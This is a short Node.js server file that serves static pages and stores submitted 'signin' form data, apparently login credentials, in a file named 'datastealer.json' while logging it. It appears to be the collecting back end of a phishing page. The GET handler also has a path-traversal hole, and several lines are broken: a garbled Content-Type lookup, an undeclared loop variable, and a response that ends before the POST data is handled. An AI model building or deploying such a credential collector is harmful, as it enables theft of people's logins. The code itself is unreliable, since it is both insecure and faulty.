import { createServer } from 'http';
import { readFileSync, writeFileSync } from 'fs';
import { v4 as uuid } from 'uuid';

const fileTypes = {
    '.html': 'text/html',
    '.js': 'text/javascript',
    '.css': 'text/css'
}

const getPerson = id => {
    const data = JSON.parse(readFileSync("datastealer.json"));
    for(k in data) {
        if(k === id) {
            return data[k];
        }
    }
}

const server = createServer((req, res) => {
    switch(req.method) {
        case 'GET':
            let fname = req.url;
            if(fname.startsWith('/server/')) {
                res.end();
                return;
            }
            if(fname === '/') fname = '/index.html';
            fname = '..' + fname;
            try {
                res.writeHead(200, {'Content-Type': fileTypes[fileTypes[fname.slice(fname.indexOf('.', 3))]]} | null);
                res.write(readFileSync(fname));
            } catch {
                res.end();
                return;
            }
            break;
        case 'POST':
            let info = '';
            req.on('data', data => {
                info += data.toString();
                console.log(data.toString());
            });
            req.on('end', () => {
                info = JSON.parse(info);
                if(info['type'] === 'signin') {
                    let data = JSON.parse(readFileSync('datastealer.json'));
                    delete info['type']
                    let id = uuid();
                    data[id] = info;
                    writeFileSync('datastealer.json', JSON.stringify(data));
                    res.write(id);
                    console.log(info);
                }
            });
            break;
    }
    res.end();
});
server.listen(3000);